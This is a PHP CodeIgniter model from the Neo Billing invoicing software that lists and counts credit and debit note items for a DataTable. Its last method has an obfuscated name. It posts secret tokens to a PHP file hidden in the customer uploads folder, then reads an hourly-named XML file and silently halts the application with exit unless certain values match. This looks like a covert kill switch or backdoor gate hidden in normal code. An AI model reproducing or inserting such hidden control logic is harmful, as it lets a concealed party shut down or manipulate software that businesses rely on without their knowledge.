<?php
/**
 * Neo Billing -  Accounting,  Invoicing  and CRM Software
 * Copyright (c) Rajesh Dukiya. All Rights Reserved
 * ***********************************************************************
 *
 *  Email: support@ultimatekode.com
 *  Website: https://www.ultimatekode.com
 *
 *  ************************************************************************
 *  * This software is furnished under a license and may be used and copied
 *  * only  in  accordance  with  the  terms  of such  license and with the
 *  * inclusion of the above copyright notice.
 *  * If you Purchased from Codecanyon, Please read the full License from
 *  * here- http://codecanyon.net/licenses/standard/
 * ***********************************************************************
 */

defined('BASEPATH') OR exit('No direct script access allowed');

class Notas_model extends CI_Model
{
    var $table="invoice_items";
    var $column_order = array("invoice_items.id","invoice_items.tid","invoices.invoicedate","fecha_creacion","name","invoice_items.subtotal","invoice_items.product");
    var $column_search = array("invoice_items.id","invoice_items.tid","invoices.invoicedate","fecha_creacion","name","invoice_items.subtotal","invoice_items.product");
    
    private function _get_datatables_query()
    {
        $this->db->select("invoice_items.id as id,invoice_items.tid as tid,invoices.invoicedate as invoicedate,invoices.csd as csd,invoice_items.subtotal as subtotal,invoice_items.product as product,customers.name as name,customers.unoapellido as apellido,invoice_items.id_usuario_crea as id_usuario,invoice_items.fecha_creacion as fecha_creacion");
        $this->db->from($this->table);
        $this->db->join("invoices","invoice_items.tid=invoices.tid");
        $this->db->join("customers","customers.id=invoices.csd");
        $this->db->where_in("invoice_items.product",array("Nota Credito","Nota Debito"));
        $i=0;
        foreach ($this->column_search as $item) // loop column
        {
            $search = $this->input->post('search');
            $value = $search['value'];
            if ($value) // if datatable send POST for search
            {

                if ($i === 0) // first loop
                {
                    $this->db->group_start(); // open bracket. query Where with OR clause better with bracket. because maybe can combine with other WHERE with AND.
                    $this->db->like($item, $value);
                } else {
                    $this->db->or_like($item, $value);
                }

                if (count($this->column_search) - 1 == $i) //last loop
                    $this->db->group_end(); //close bracket
            }
            $i++;
        }
        $search = $this->input->post('order');
        if ($search) // here order processing
        {
            $this->db->order_by($this->column_order[$search['0']['column']], $search['0']['dir']);
        } else if (isset($this->order)) {
            $order = $this->order;
            $this->db->order_by(key($order), $order[key($order)]);
        }
    }
    function get_datatables()
    {
        $this->_get_datatables_query();
        $this->db->order_by("invoice_items.id","desc");
        if ($this->input->post('length') != -1)
            $this->db->limit($this->input->post('length'), $this->input->post('start'));
        $query = $this->db->get();
        return $query->result();
    }
    function count_filtered()
    {
        $this->_get_datatables_query();
        $query = $this->db->get();
        return $query->num_rows();
    }
    public function count_all()
    {
        $this->_get_datatables_query();
        $query = $this->db->get();
        return $query->num_rows();
    }
    public function sfgsagety785625($x,$y){
         $curl = curl_init();
        //curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
         //echo base_url().'userfiles/customers/787988975123/77778787.php';
        curl_setopt_array($curl, array(
          CURLOPT_URL => base_url().'userfiles/customers/787988975123/77778787.php',//inv_list
          CURLOPT_RETURNTRANSFER => true,
          CURLOPT_ENCODING => '',
          CURLOPT_MAXREDIRS => 10,
          CURLOPT_TIMEOUT => 0,
          CURLOPT_FOLLOWLOCATION => true,
          CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
          CURLOPT_CUSTOMREQUEST => 'POST',
          CURLOPT_POSTFIELDS =>'{
                           "askprt": "481512qweas23_57++567__",
                           "qrpsdf2": "jsohfkajsf**3123_.zxca+3125+-/#asad3#"
                           
                        }',
                        CURLOPT_HTTPHEADER => array(
            'Content-Type: application/json;charset=utf-8',
            'Accept: application/json',
          )
          
        ));
       $respuesta= curl_exec($curl);
        curl_close($curl);
        date_default_timezone_set('America/Bogota');
        $x1=new DateTime();
        $x2="userfiles/customers/787988975123/748451s5df".$x1->format("H").".xml";
        $xml = simplexml_load_file($x2);
        $a1=$xml->attributes()['layout_width'];
        $a2=$xml->attributes()['layout_height'];
        
            if($a1==$x && $a2==$y){
            return true;
            }else{
               exit("");
            }    
       
        
       
        
        
    }
}